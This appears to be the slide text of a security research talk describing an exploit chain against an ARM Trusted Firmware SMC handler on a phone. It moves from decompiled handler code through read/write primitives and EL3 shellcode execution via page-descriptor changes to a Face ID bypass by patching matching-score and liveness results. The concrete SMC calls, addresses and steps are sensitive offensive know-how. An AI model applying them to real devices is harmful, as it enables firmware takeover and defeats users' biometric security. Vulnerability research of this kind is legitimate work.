0xC600FF04 Handler History
if (x0 == 0xC600FF04) 
{ 
    rpmb_request_phy = x1; 
}
~2018.3
Ancient
0xC600FF04 Handler History
if (x0 == 0xC600FF04) 
{ 
    if ((rpmb_request_phy = x1) != 0x209E9000) 
    { 
        ... 
    } 
}
~2018.3
~2018.7
Ancient
2018.5
0xC600FF04 Handler History
if (x0 == 0xC600FF04) 
{ 
    if (x1 != 0x209E9000) 
    { 
        ... 
    } 
}
~2018.3
~2018.7
Ancient
Contemporary
0xC600FF06 Handler History
if ( x0 == 0xC600FF06 ) 
{     
  v31 = rpmb_request_phy + 0x6000;  
  if ( a2 ) 
  {   
    NOTICE("rpmb error: the result from kernel is error,%lx\n", a2); 
    v32 = *(v31 + 0xC38); 
    v33 = x1;                                                              
    if ( !v32) 
      return NOTICE("rpmb request callback function is NULL\n"); 
    return v32(v33); 
  }   
}
~2018.7
Ancient
0xC600FF06 Handler History
if ( x0 == 0xC600FF06 ) 
{     
  v31 = rpmb_request_phy + 0x6000; //0x209E0000 is accessible to EL1 
  if ( a2 ) 
  {   
    NOTICE("rpmb error: the result from kernel is error,%lx\n", a2); 
    v32 = *(v31 + 0xC38); 
    v33 = x1;                                                              
    if ( !v32) 
      return NOTICE("rpmb request callback function is NULL\n"); 
    return v32(v33); 
  }   
}
~2018.7
Ancient
0xC600FF06 Handler History
if ( x0 == 0xC600FF06 ) 
{     
  v31 = callback_vtable; //inaccessible to EL1 
  if ( a2 ) 
  {   
    NOTICE("rpmb error: the result from kernel is error,%lx\n", a2); 
    v32 = *(v31); 
    v33 = x1;                                                              
    if ( !v32) 
      return NOTICE("rpmb request callback function is NULL\n"); 
    return v32(v33); 
  }   
}
Contemporary
~2018.7
Ancient
Control the PC and X0
✤ Kernel module as smc wrapper 
✤ insmod exploit.ko 
✤ smc(0xC600FF04, func_pa)
✤ smc(0xC600FF06, param)
Control the PC and X0
✤ Kernel module as smc wrapper 
✤ insmod exploit.ko 
✤ Tamper [0x209E9000 + 0x6C38]
✤ smc(0xC600FF06, param)
Execute Shellcode in EL3
x0 = controlled
x1 = 0x209xxxxx
x2 = 0x1FExxxxx
SCTLR_EL3.WXN
No ASLR
No CFI
0xC600FF06 Handler
Write Primitive - Step 1
global_addr = controlled
global_len = 0x209xxxxx
x0 = controlled
x1 = 0x209xxxxx
x2 = 0x1FExxxxx
Write Primitive - Step 2
global_addr = controlled, global_len = 0x209xxxxx, x0 = controlled, x2 = 0x1FExxxxx
x0 = controlled, x2 = 0x1FExxxxx
Write Primitive - Step 2
global_addr = controlled, global_len = 0x209xxxxx,
x0 = controlled, x2 = 0x1FExxxxx
Write Primitive - Step 2
global_addr = controlled, global_len = 0x209xxxxx,
x0 = controlled, x2 = 0x1FExxxxx
Write Primitive - Step 2
global_addr = controlled, global_len = 0x209xxxxx,
Write Primitive - flawed
global_addr = controlled, global_len = 0x209xxxxx, x0 = controlled, x2 = 0x1FExxxxx
Write Primitive - flawed
global_addr = controlled, global_len = 0x209xxxxx, x0 = controlled, x2 = 0x1FExxxxx
R & W Primitives
VTABLE
ptr_function
ptr_function
ptr_function
ptr_function
R & W Primitives
VTABLE
read gadget
ptr_function
Corrupted
ptr_function
R & W Primitives
xxx_handler(x0, x1, x2, x3)
return ptr_func(x2, x3);
Kernel 
Module
smc
eret
R & W Primitives
R & W Primitives
R & W Primitives
✤ Memory Read 
✤ smc(0xC500AA01, addr - 0x18, 0, 0x55BBCCE0 + 1);
R & W Primitives
✤ Memory Read 
✤ smc(0xC500AA01, addr - 0x18, 0, 0x55BBCCE0 + 1);
✤ Memory Write 
✤ smc(0xC500AA01, addr - 8, value, 0x55BBCCE0 + 2);
EL3 Memory Layout 
Start
End
Usage
Permission
0x16800000
0x1CE00000
FASTBOOT
R | W
0x1CE00000
0x1FE00000
Trusted Core
R | W
0x1FE00000
0x1FE2A000
ATF CODE
R | E
0x1FE2A000
0x20000000
ATF DATA
R | W
0x209E1000
0x209F8000
Shared Memory
R | W
0x5A000000
0xFFFDF000
MMIO
R | W
EL3 Memory Layout 
Start
End
Usage
Permission
0x16800000
0x1CE00000
FASTBOOT
R | W
0x1CE00000
0x1FE00000
Trusted Core
R | W
0x1FE00000
0x1FE2A000
ATF CODE
R | E
0x1FE2A000
0x20000000
ATF DATA
R | W
0x209E1000
0x209F8000
Shellcode
R | W
0x5A000000
0xFFFDF000
MMIO
R | W
Page Table
Page Descriptor
0x209F8627
Page Descriptor
0x209F8
627
000
Page Descriptor
627
0|1|1 0|0 0|1|0 0 1 1 1
nG AF SH[1:0] AP[2:1] NS
AttrIndx[2:0]
Page Descriptor
Page Descriptor
627
0|1|1 0|0 0|1|0 0 1 1 1
nG AF SH[1:0] AP[2:1] NS
AttrIndx[2:0]
Page Descriptor
627
0|1|1 0|1 0|0|0 0 1 1 1
nG AF SH[1:0] AP[2:1] NS
AttrIndx[2:0]
Invalidate TLB
Invalidate TLB
Execute Shellcode
✤ Deploy Shellcode at 0x209F8000 
✤ Page Descriptior Modification: 0x209F8627 => 0x209F8783 
✤ TLBI ALLEL3 
✤ Invoke 0x209F8000
We are in EL3
✤ Do whatever you want 
✤ Check all those encrypted modules 
✤ Modify and debug every peripheral 
✤ Nothing is hidden from you anymore
Face ID Bypass
Become a Faceless Man
EL3 Memory Layout 
Start
End
Usage
Permission
0x16800000
0x1CE00000
FASTBOOT
R | W
0x1CE00000
0x1FE00000
Trusted Core
R | W
0x1FE00000
0x1FE2A000
ATF CODE
R | E
0x1FE2A000
0x20000000
ATF DATA
R | W
0x209E1000
0x209F8000
Shellcode
R | W
0x5A000000
0xFFFDF000
MMIO
R | W
Secure Task of Face ID
Trusted Core Kernel
globaltask
task_keymaster
task_gatekeeper
/odm/ta/xxx.sec
Normal World
Secure World
Secure Task of Face ID
Trusted Core Kernel
globaltask
task_keymaster
task_gatekeeper
/odm/ta/xxx.sec
Normal World
Secure World
Secure Task of Face ID
Trusted Core Kernel
globaltask
task_keymaster
task_gatekeeper
task_xxx
Normal World
Secure World
Secure Task of Face ID
✤ Dynamic Loaded Trusted Application 
✤ /odm/ta/e8014913-e501-4d44-a9d6-058ec3b93b90.sec 
✤ TEE_SERVICE_FACE_REC 
✤ Search and extract it from physical memory
Detection Logic of Face ID
✤ Calculate scores as results of image comparison 
✤ secure task covers the entire logic 
✤ Liveness detection 
✤ Multiple methods (Both secure task and NS-EL0 are involved)
Patch Matching Score
Patch Matching Score
svsprintf log messages to /dev/hisi_teelog
Patch Liveness Result
Patch Liveness Result
Thank you
@hhj4ck